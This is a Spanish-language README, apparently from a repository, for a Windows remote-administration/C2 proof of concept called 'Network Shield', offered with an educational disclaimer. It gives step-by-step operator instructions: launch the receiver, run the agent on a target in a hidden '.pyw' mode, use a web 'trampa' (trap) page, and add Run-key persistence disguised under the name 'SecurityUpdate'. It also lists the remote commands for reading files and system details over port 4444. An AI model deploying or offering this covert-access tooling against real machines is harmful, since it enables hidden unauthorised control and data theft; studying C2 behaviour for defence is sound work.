🛡️ Network Shield - Remote Administration System (PoC)
Este proyecto es una Prueba de Concepto (PoC) diseñada para estudiar el funcionamiento de los sistemas de administración remota (C2) y las técnicas de persistencia en entornos Windows.

⚠️ AVISO LEGAL: Este software ha sido creado exclusivamente con fines educativos y de investigación en ciberseguridad. El autor no se hace responsable del mal uso de este código. El uso en sistemas sin autorización es ilegal.

📡 Ejecución y Pruebas
Sigue este orden estricto para establecer el enlace:

🟢 Paso 1: Iniciar el Receptor (Master)
Abre una terminal en la carpeta master/ y lanza el centro de control ejecutando:
python receptor.py

🔵 Paso 2: Lanzar el Agente (Client)
Ejecuta el script en el equipo objetivo para iniciar la conexión:

Modo Manual: python client/agente.py

Modo Invisible: Renombra a agente.pyw y ejecútalo.

Simulación Web: Accede a http://localhost/Network-Shield-System/server/trampa.php

🔐 Implementación de Persistencia
La persistencia permite que el agente se ejecute automáticamente al iniciar sesión en Windows.

1️⃣ Instalación (Crear Registro)
Envía este comando desde la terminal del receptor para registrar el agente:
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /t REG_SZ /d "pythonw.exe C:\xampp\htdocs\Network-Shield-System\client\agente.pyw" /f

2️⃣ Comprobación (Verificar Estado)
Para confirmar que el registro se ha creado correctamente, ejecuta:
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate"

3️⃣ Eliminación (Limpieza del Sistema)
Para desactivar el inicio automático y dejar el sistema limpio, ejecuta:
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdate" /f

📂 Estructura del Repositorio
server/: Panel de control web y base de datos.

client/: Ejecución de comandos en el objetivo (agente).

master/: Consola interactiva C2 (Command & Control).

📋 Comandos de Auditoría Disponibles
💻 Sistema: whoami, systeminfo, tasklist, ipconfig.

📂 Archivos: dir, cd .., type archivo.txt.

🌐 Remoto: start https://google.com, msg * "Acceso detectado".

🚪 Sesión: exit (Cierra la conexión de forma segura).

🛠️ Troubleshooting (Solución de Problemas)
¿No conecta?: Verifica que el puerto 4444 esté abierto en el Firewall de Windows.

¿No aparece en la Web?: Revisa que la URL en agente.py sea la correcta.

¿Error de SQL?: Asegúrate de que el usuario de MySQL sea root y no tenga contraseña.
